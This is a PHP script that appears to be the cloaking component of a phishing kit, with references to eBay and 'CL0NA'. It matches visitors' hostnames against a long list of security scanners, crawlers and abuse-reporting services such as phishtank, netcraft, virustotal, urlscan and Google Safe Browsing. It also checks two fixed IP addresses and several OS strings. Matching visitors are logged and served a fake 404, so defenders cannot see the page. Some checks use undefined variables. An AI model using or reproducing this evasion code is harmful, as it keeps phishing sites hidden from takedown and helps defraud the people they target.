<?php
$useragent = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array(
     "bot",
     "above",
     "google",
     "Googlebot",
     "docomo",
     "mediapartners",
     "phantomjs",
     "lighthouse",
	 "NetcraftSurveyAgent",
	 "Netcraft Survey Agent",
	 "wintek",
	 "netcraft",
	 "sift",
	 "datasift",
     "reverseshorturl",
     "samsung-sgh-e250",
     "softlayer",
     "amazonaws",
	 "Fortinet",
	 "Fortinet.com",
     "cyveillance",
     "crawler",
     "gsa-crawler",
     "phishtank",
     "dreamhost",
     "netpilot",
     "calyxinstitute",
     "tor-exit",
     "apache-httpclient",
     "lssrocketcrawler",
     "crawler",
     "urlredirectresolver",
     "jetbrains",
     "spam",
     "windows 95",
     "windows 98",
     "acunetix",
     "netsparker",
     "007ac9",
     "008",
     "Feedfetcher",
     "192.comagent",
     "200pleasebot",
     "360spider",
     "4seohuntbot",
     "50.nu",
     "a6-indexer",
     "admantx",
     "amznkassocbot",
     "aboundexbot",
     "aboutusbot",
     "abrave spider",
     "accelobot",
     "acoonbot",
     "addthis.com",
     "adsbot-google",
     "ahrefsbot",
     "alexabot",
     "amagit.com",
     "analytics",
     "antbot",
     "apercite",
     "aportworm",
     "EBAY",
     "CL0NA",
     "jabber",
     "ebay",
     "arabot",
     "hotmail!",
     "msn!",
     "baidu",
     "outlook!",
     "outlook",
     "msn",
     "duckduckbot",
     "hotmail",
     "go-http-client",
     "go-http-client/1.1",
     "trident",
     "presto",
     "virustotal",
     "unchaos",
     "dreampassport",
     "sygol",
     "nutch",
     "privoxy",
     "zipcommander",
     "neofonie",
     "abacho",
     "acoi",
     "acoon",
     "adaxas",
     "agada",
     "aladin",
     "alkaline",
     "amibot",
     "anonymizer",
     "aplix",
     "aspseek",
     "avant",
     "baboom",
     "anzwers",
     "anzwerscrawl",
     "crawlconvera",
     "del.icio.us",
     "camehttps",
     "annotate",
     "wapproxy",
     "translate",
     "feedfetcher",
     "ask24",
     "asked",
     "askaboutoil",
     "fangcrawl",
     "amzn_assoc",
     "bingpreview",
     "dr.web",
     "drweb",
     "bilbo",
     "blackwidow",
     "sogou",
     "sogou-test-spider",
     "exabot",
     "externalhit",
     "ia_archiver",
     "googletranslate",
	 "SiftScience",
     "translate",
     "proxy",
     "dalvik",
     "quicklook",
     "seamonkey",
     "sylera",
     "safebrowsing",
     "safesurfingwidget",
     "preview",
     "whatsapp",
     "telegram",
     "instagram",
     "zteopen",
     "icoreservice",
     "urlscan"
     
);

 foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
		$file = fopen("block_wrd.txt","a");
            fwrite($file," BLOCKED BY USER AGENT || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
            header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
            
        }  
    }

if($ip == "92.23.57.168" or $ip == "96.31.1.4") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
         $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
            header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
            
}

if($useragent == "Windows Server 2003/XP x64" and $br == "Firefox") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
         $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
            header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
            
}

if($useragent == "Windows XP" and $br == "Firefox") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
            header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
            
}

if($useragent == "Windows XP" and $br == "Internet Explorer") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
            header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
}

if($useragent == "Windows XP" and $br == "Chrome") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
             header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
            
}

if($useragent == "Windows Vista" and $br == "Internet Explorer") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
            header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
            
}

if($useragent == "Chrome OS") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
            header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
            
}

if($useragent == "BlackBerry") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
            header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
            
}

if($useragent == "Linux") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
            header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
            
}

if($useragent == "Unknown Browser") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
            header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
            
}

if($useragent == "Internet Explorer") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
            header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
            
}

if($useragent == "Windows 2000") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
            header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
            
}

if($useragent == "Unknown OS Platform") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
            header('HTTP/1.0 404 Not Found');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404
Not Found</title></head><body><h1>404 Not Found</h1><p>
The resource requested could not be found on this server!</p></body></html>');
            
}